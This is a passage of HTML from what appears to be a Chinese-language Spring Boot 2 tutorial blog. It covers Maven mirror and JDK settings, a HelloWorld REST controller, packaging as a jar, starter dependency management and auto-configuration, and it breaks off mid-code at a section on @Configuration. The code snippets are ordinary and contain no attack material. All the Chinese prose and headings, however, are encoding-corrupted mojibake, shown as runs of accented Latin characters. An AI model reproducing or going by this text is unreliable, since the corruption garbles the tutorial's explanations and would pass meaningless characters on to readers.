title="äº‘åŸç”Ÿ"></a>äº‘åŸç”Ÿ</h3><p>åŸç”Ÿåº”ç”¨å¦‚ä½•ä¸Šäº‘ã€‚ Cloud Native</p><h4 id="ä¸Šäº‘çš„å›°éš¾"><a href="#ä¸Šäº‘çš„å›°éš¾" class="headerlink" title="ä¸Šäº‘çš„å›°éš¾"></a>ä¸Šäº‘çš„å›°éš¾</h4><ul><li>æœåŠ¡è‡ªæ„ˆ</li><li>å¼¹æ€§ä¼¸ç¼©</li><li>æœåŠ¡éš”ç¦»</li><li>è‡ªåŠ¨åŒ–éƒ¨ç½²</li><li>ç°åº¦å‘å¸ƒ</li><li>æµé‡æ²»ç†</li><li>â€¦â€¦</li></ul><h4 id="ä¸Šäº‘çš„è§£å†³"><a href="#ä¸Šäº‘çš„è§£å†³" class="headerlink" title="ä¸Šäº‘çš„è§£å†³"></a>ä¸Šäº‘çš„è§£å†³</h4><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205004621290.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="04ã€åŸºç¡€å…¥é—¨-SpringBootå®˜æ–¹æ–‡æ¡£æ¶æ„"><a href="#04ã€åŸºç¡€å…¥é—¨-SpringBootå®˜æ–¹æ–‡æ¡£æ¶æ„" class="headerlink" title="04ã€åŸºç¡€å…¥é—¨-SpringBootå®˜æ–¹æ–‡æ¡£æ¶æ„"></a>04ã€åŸºç¡€å…¥é—¨-SpringBootå®˜æ–¹æ–‡æ¡£æ¶æ„</h2><ul><li><a href="https://spring.io/projects/spring-boot">Spring Bootå®˜ç½‘</a></li><li><a href="https://docs.spring.io/spring-boot/docs/">Spring Bootå®˜æ–¹æ–‡æ¡£</a></li></ul><h3 id="å®˜ç½‘æ–‡æ¡£æ¶æ„"><a href="#å®˜ç½‘æ–‡æ¡£æ¶æ„" class="headerlink" title="å®˜ç½‘æ–‡æ¡£æ¶æ„"></a>å®˜ç½‘æ–‡æ¡£æ¶æ„</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205004733270.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205004828702.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><a href="https://github.com/spring-projects/spring-boot/wiki#release-notes">æŸ¥çœ‹ç‰ˆæœ¬æ–°ç‰¹æ€§</a></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205005342147.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="05ã€åŸºç¡€å…¥é—¨-SpringBoot-HelloWorld"><a href="#05ã€åŸºç¡€å…¥é—¨-SpringBoot-HelloWorld" class="headerlink" title="05ã€åŸºç¡€å…¥é—¨-SpringBoot-HelloWorld"></a>05ã€åŸºç¡€å…¥é—¨-SpringBoot-HelloWorld</h2><h3 id="ç³»ç»Ÿè¦æ±‚"><a href="#ç³»ç»Ÿè¦æ±‚" class="headerlink" title="ç³»ç»Ÿè¦æ±‚"></a>ç³»ç»Ÿè¦æ±‚</h3><ul><li>Java 8</li><li>Maven 3.3+</li><li>IntelliJ IDEA 2019.1.2</li></ul><h4 id="Mavené…ç½®æ–‡ä»¶"><a href="#Mavené…ç½®æ–‡ä»¶" class="headerlink" title="Mavené…ç½®æ–‡ä»¶"></a>Mavené…ç½®æ–‡ä»¶</h4><p>æ–°æ·»å†…å®¹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mirrors</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>nexus-aliyun<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>central<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Nexus aliyun<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mirrors</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">profiles</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">profile</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>jdk-1.8<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">activation</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">activeByDefault</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">activeByDefault</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">jdk</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">jdk</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">activation</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.compilerVersion</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">profile</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">profiles</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="HelloWorldé¡¹ç›®"><a href="#HelloWorldé¡¹ç›®" class="headerlink" title="HelloWorldé¡¹ç›®"></a>HelloWorldé¡¹ç›®</h3><p>éœ€æ±‚ï¼šæµè§ˆå‘é€&#x2F;helloè¯·æ±‚ï¼Œå“åº” â€œHelloï¼ŒSpring Boot 2â€</p><h4 id="åˆ›å»ºmavenå·¥ç¨‹"><a href="#åˆ›å»ºmavenå·¥ç¨‹" class="headerlink" title="åˆ›å»ºmavenå·¥ç¨‹"></a>åˆ›å»ºmavenå·¥ç¨‹</h4><h4 id="å¼•å…¥ä¾èµ–"><a href="#å¼•å…¥ä¾èµ–" class="headerlink" title="å¼•å…¥ä¾èµ–"></a>å¼•å…¥ä¾èµ–</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="åˆ›å»ºä¸»ç¨‹åº"><a href="#åˆ›å»ºä¸»ç¨‹åº" class="headerlink" title="åˆ›å»ºä¸»ç¨‹åº"></a>åˆ›å»ºä¸»ç¨‹åº</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(MainApplication.class, args);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="ç¼–å†™ä¸šåŠ¡"><a href="#ç¼–å†™ä¸šåŠ¡" class="headerlink" title="ç¼–å†™ä¸šåŠ¡"></a>ç¼–å†™ä¸šåŠ¡</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">handle01</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, Spring Boot 2!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="è¿è¡Œ-amp-æµ‹è¯•"><a href="#è¿è¡Œ-amp-æµ‹è¯•" class="headerlink" title="è¿è¡Œ&amp;æµ‹è¯•"></a>è¿è¡Œ&amp;æµ‹è¯•</h4><ul><li>è¿è¡Œ<code>MainApplication</code>ç±»</li><li>æµè§ˆå™¨è¾“å…¥<code>http://localhost:8888/hello</code>ï¼Œå°†ä¼šè¾“å‡º<code>Hello, Spring Boot 2!</code>ã€‚</li></ul><h4 id="è®¾ç½®é…ç½®"><a href="#è®¾ç½®é…ç½®" class="headerlink" title="è®¾ç½®é…ç½®"></a>è®¾ç½®é…ç½®</h4><p>mavenå·¥ç¨‹çš„resourceæ–‡ä»¶å¤¹ä¸­åˆ›å»ºapplication.propertiesæ–‡ä»¶ã€‚</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment"># è®¾ç½®ç«¯å£å·</span><br><span class="hljs-attr">server.port</span>=<span class="hljs-string">8888</span><br></code></pre></td></tr></table></figure><p><a href="https://docs.spring.io/spring-boot/docs/2.3.7.RELEASE/reference/html/appendix-application-properties.html#common-application-properties-server">æ›´å¤šé…ç½®ä¿¡æ¯</a></p><h4 id="æ‰“åŒ…éƒ¨ç½²"><a href="#æ‰“åŒ…éƒ¨ç½²" class="headerlink" title="æ‰“åŒ…éƒ¨ç½²"></a>æ‰“åŒ…éƒ¨ç½²</h4><p>åœ¨pom.xmlæ·»åŠ </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨IDEAçš„Mavenæ’ä»¶ä¸Šç‚¹å‡»è¿è¡Œ clean ã€packageï¼ŒæŠŠhelloworldå·¥ç¨‹é¡¹ç›®çš„æ‰“åŒ…æˆjaråŒ…ï¼Œ</p><p>æ‰“åŒ…å¥½çš„jaråŒ…è¢«ç”Ÿæˆåœ¨helloworldå·¥ç¨‹é¡¹ç›®çš„targetæ–‡ä»¶å¤¹å†…ã€‚</p><p>ç”¨cmdè¿è¡Œ<code>java -jar boot-01-helloworld-1.0-SNAPSHOT.jar</code>ï¼Œæ—¢å¯ä»¥è¿è¡Œhelloworldå·¥ç¨‹é¡¹ç›®ã€‚</p><p>å°†jaråŒ…ç›´æ¥åœ¨ç›®æ ‡æœåŠ¡å™¨æ‰§è¡Œå³å¯ã€‚</p><h2 id="06ã€åŸºç¡€å…¥é—¨-SpringBoot-ä¾èµ–ç®¡ç†ç‰¹æ€§"><a href="#06ã€åŸºç¡€å…¥é—¨-SpringBoot-ä¾èµ–ç®¡ç†ç‰¹æ€§" class="headerlink" title="06ã€åŸºç¡€å…¥é—¨-SpringBoot-ä¾èµ–ç®¡ç†ç‰¹æ€§"></a>06ã€åŸºç¡€å…¥é—¨-SpringBoot-ä¾èµ–ç®¡ç†ç‰¹æ€§</h2><ul><li>çˆ¶é¡¹ç›®åšä¾èµ–ç®¡ç†</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml">ä¾èµ–ç®¡ç†<br><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br><br>ä¸Šé¢é¡¹ç›®çš„çˆ¶é¡¹ç›®å¦‚ä¸‹ï¼š<br><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br><br>å®ƒå‡ ä¹å£°æ˜äº†æ‰€æœ‰å¼€å‘ä¸­å¸¸ç”¨çš„ä¾èµ–çš„ç‰ˆæœ¬å·ï¼Œè‡ªåŠ¨ç‰ˆæœ¬ä»²è£æœºåˆ¶<br></code></pre></td></tr></table></figure><ul><li>å¼€å‘å¯¼å…¥starteråœºæ™¯å¯åŠ¨å™¨<ol><li>è§åˆ°å¾ˆå¤š spring-boot-starter-* ï¼š *å°±æŸç§åœºæ™¯</li><li>åªè¦å¼•å…¥starterï¼Œè¿™ä¸ªåœºæ™¯çš„æ‰€æœ‰å¸¸è§„éœ€è¦çš„ä¾èµ–æˆ‘ä»¬éƒ½è‡ªåŠ¨å¼•å…¥</li><li><a href="https://docs.spring.io/spring-boot/docs/current/reference/html/using-spring-boot.html#using-boot-starter">æ›´å¤šSpringBootæ‰€æœ‰æ”¯æŒçš„åœºæ™¯</a></li><li>è§åˆ°çš„  *-spring-boot-starterï¼š ç¬¬ä¸‰æ–¹ä¸ºæˆ‘ä»¬æä¾›çš„ç®€åŒ–å¼€å‘çš„åœºæ™¯å¯åŠ¨å™¨ã€‚</li></ol></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">æ‰€æœ‰åœºæ™¯å¯åŠ¨å™¨æœ€åº•å±‚çš„ä¾èµ–<br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><p>æ— éœ€å…³æ³¨ç‰ˆæœ¬å·ï¼Œè‡ªåŠ¨ç‰ˆæœ¬ä»²è£</p><ol><li>å¼•å…¥ä¾èµ–é»˜è®¤éƒ½å¯ä»¥ä¸å†™ç‰ˆæœ¬</li><li>å¼•å…¥éç‰ˆæœ¬ä»²è£çš„jarï¼Œè¦å†™ç‰ˆæœ¬å·ã€‚</li></ol></li><li><p>å¯ä»¥ä¿®æ”¹é»˜è®¤ç‰ˆæœ¬å·</p><ol><li>æŸ¥çœ‹spring-boot-dependenciesé‡Œé¢è§„å®šå½“å‰ä¾èµ–çš„ç‰ˆæœ¬ ç”¨çš„ keyã€‚</li><li>åœ¨å½“å‰é¡¹ç›®é‡Œé¢é‡å†™é…ç½®ï¼Œå¦‚ä¸‹é¢çš„ä»£ç ã€‚</li></ol></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mysql.version</span>&gt;</span>5.1.43<span class="hljs-tag">&lt;/<span class="hljs-name">mysql.version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><p>IDEAå¿«æ·é”®ï¼š</p><ul><li><code> ctrl + shift + alt + U</code>ï¼šä»¥å›¾çš„æ–¹å¼æ˜¾ç¤ºé¡¹ç›®ä¸­ä¾èµ–ä¹‹é—´çš„å…³ç³»ã€‚</li><li><code>alt + ins</code>ï¼šç›¸å½“äºEclipseçš„ Ctrl + Nï¼Œåˆ›å»ºæ–°ç±»ï¼Œæ–°åŒ…ç­‰ã€‚</li></ul><h2 id="07ã€åŸºç¡€å…¥é—¨-SpringBoot-è‡ªåŠ¨é…ç½®ç‰¹æ€§"><a href="#07ã€åŸºç¡€å…¥é—¨-SpringBoot-è‡ªåŠ¨é…ç½®ç‰¹æ€§" class="headerlink" title="07ã€åŸºç¡€å…¥é—¨-SpringBoot-è‡ªåŠ¨é…ç½®ç‰¹æ€§"></a>07ã€åŸºç¡€å…¥é—¨-SpringBoot-è‡ªåŠ¨é…ç½®ç‰¹æ€§</h2><ul><li>è‡ªåŠ¨é…å¥½Tomcat<ul><li>å¼•å…¥Tomcatä¾èµ–ã€‚</li><li>é…ç½®Tomcat</li></ul></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><p>è‡ªåŠ¨é…å¥½SpringMVC</p><ul><li>å¼•å…¥SpringMVCå…¨å¥—ç»„ä»¶</li><li>è‡ªåŠ¨é…å¥½SpringMVCå¸¸ç”¨ç»„ä»¶ï¼ˆåŠŸèƒ½ï¼‰</li></ul></li><li><p>è‡ªåŠ¨é…å¥½Webå¸¸è§åŠŸèƒ½ï¼Œå¦‚ï¼šå­—ç¬¦ç¼–ç é—®é¢˜</p><ul><li>SpringBootå¸®æˆ‘ä»¬é…ç½®å¥½äº†æ‰€æœ‰webå¼€å‘çš„å¸¸è§åœºæ™¯</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//1ã€è¿”å›æˆ‘ä»¬IOCå®¹å™¨</span><br>    <span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> SpringApplication.run(MainApplication.class, args);<br><br>    <span class="hljs-comment">//2ã€æŸ¥çœ‹å®¹å™¨é‡Œé¢çš„ç»„ä»¶</span><br>    String[] names = run.getBeanDefinitionNames();<br>    <span class="hljs-keyword">for</span> (String name : names) &#123;<br>        System.out.println(name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>é»˜è®¤çš„åŒ…ç»“æ„<ul><li>ä¸»ç¨‹åºæ‰€åœ¨åŒ…åŠå…¶ä¸‹é¢çš„æ‰€æœ‰å­åŒ…é‡Œé¢çš„ç»„ä»¶éƒ½ä¼šè¢«é»˜è®¤æ‰«æè¿›æ¥</li><li>æ— éœ€ä»¥å‰çš„åŒ…æ‰«æé…ç½®</li><li>æƒ³è¦æ”¹å˜æ‰«æè·¯å¾„<ul><li>@SpringBootApplication(scanBasePackages&#x3D;â€com.lunâ€)</li><li>@ComponentScan æŒ‡å®šæ‰«æè·¯å¾„</li></ul></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootApplication</span><br>ç­‰åŒäº<br><span class="hljs-meta">@SpringBootConfiguration</span><br><span class="hljs-meta">@EnableAutoConfiguration</span><br><span class="hljs-meta">@ComponentScan(&quot;com.lun&quot;)</span><br></code></pre></td></tr></table></figure><ul><li><p>å„ç§é…ç½®æ‹¥æœ‰é»˜è®¤å€¼</p><ul><li>é»˜è®¤é…ç½®æœ€ç»ˆéƒ½æ˜¯æ˜ å°„åˆ°æŸä¸ªç±»ä¸Šï¼Œå¦‚ï¼š<code>MultipartProperties</code></li><li>é…ç½®æ–‡ä»¶çš„å€¼æœ€ç»ˆä¼šç»‘å®šæ¯ä¸ªç±»ä¸Šï¼Œè¿™ä¸ªç±»ä¼šåœ¨å®¹å™¨ä¸­åˆ›å»ºå¯¹è±¡</li></ul></li><li><h2 id="æŒ‰éœ€åŠ è½½æ‰€æœ‰è‡ªåŠ¨é…ç½®é¡¹-éå¸¸å¤šçš„starter-å¼•å…¥äº†å“ªäº›åœºæ™¯è¿™ä¸ªåœºæ™¯çš„è‡ªåŠ¨é…ç½®æ‰ä¼šå¼€å¯-SpringBootæ‰€æœ‰çš„è‡ªåŠ¨é…ç½®åŠŸèƒ½éƒ½åœ¨-spring-boot-autoconfigure-åŒ…é‡Œé¢"><a href="#æŒ‰éœ€åŠ è½½æ‰€æœ‰è‡ªåŠ¨é…ç½®é¡¹-éå¸¸å¤šçš„starter-å¼•å…¥äº†å“ªäº›åœºæ™¯è¿™ä¸ªåœºæ™¯çš„è‡ªåŠ¨é…ç½®æ‰ä¼šå¼€å¯-SpringBootæ‰€æœ‰çš„è‡ªåŠ¨é…ç½®åŠŸèƒ½éƒ½åœ¨-spring-boot-autoconfigure-åŒ…é‡Œé¢" class="headerlink" title="æŒ‰éœ€åŠ è½½æ‰€æœ‰è‡ªåŠ¨é…ç½®é¡¹- éå¸¸å¤šçš„starter- å¼•å…¥äº†å“ªäº›åœºæ™¯è¿™ä¸ªåœºæ™¯çš„è‡ªåŠ¨é…ç½®æ‰ä¼šå¼€å¯- SpringBootæ‰€æœ‰çš„è‡ªåŠ¨é…ç½®åŠŸèƒ½éƒ½åœ¨ spring-boot-autoconfigure åŒ…é‡Œé¢"></a>æŒ‰éœ€åŠ è½½æ‰€æœ‰è‡ªåŠ¨é…ç½®é¡¹<br>- éå¸¸å¤šçš„starter<br>- å¼•å…¥äº†å“ªäº›åœºæ™¯è¿™ä¸ªåœºæ™¯çš„è‡ªåŠ¨é…ç½®æ‰ä¼šå¼€å¯<br>- SpringBootæ‰€æœ‰çš„è‡ªåŠ¨é…ç½®åŠŸèƒ½éƒ½åœ¨ spring-boot-autoconfigure åŒ…é‡Œé¢</h2></li><li><p>â€¦â€¦</p></li></ul><h2 id="08ã€åº•å±‚æ³¨è§£-Configurationè¯¦è§£"><a href="#08ã€åº•å±‚æ³¨è§£-Configurationè¯¦è§£" class="headerlink" title="08ã€åº•å±‚æ³¨è§£-@Configurationè¯¦è§£"></a>08ã€åº•å±‚æ³¨è§£-@Configurationè¯¦è§£</h2><ul><li>åŸºæœ¬ä½¿ç”¨<ul><li>Fullæ¨¡å¼ä¸Liteæ¨¡å¼</li><li>ç¤ºä¾‹</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 